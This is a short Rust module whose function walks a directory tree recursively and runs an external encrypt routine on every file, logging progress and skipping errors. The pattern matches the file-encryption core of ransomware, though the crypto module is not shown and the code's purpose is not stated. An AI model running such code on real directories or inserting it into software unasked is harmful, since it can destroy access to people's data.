use crate::crypto;
use std::fs::read_dir;
use std::io;
use std::path::Path;

/// Recursively traverses a given directory
pub fn visit_dirs(dir: &Path) -> io::Result<()> {
    // check path is a valid directory, not a file
    if dir.is_dir() {
        for entry in read_dir(dir)? {
            let entry = entry?;
            let path = entry.path();

            if path.is_dir() {
                visit_dirs(&path)?; // recursive call into dir
            } else {
                println!("encrypting: {}", path.display());
                let s = path.to_string_lossy();
                // Handle encryption result
                match crypto::encrypt(&s) {
                    Ok(()) => {
                        println!("encrypted: {}", path.display());
                    }
                    Err(e) => {
                        eprintln!("skipped {}: {}", path.display(), e);
                        // continue walking instead of crashing
                    }
                }
            }
        }
    }
    Ok(())
}
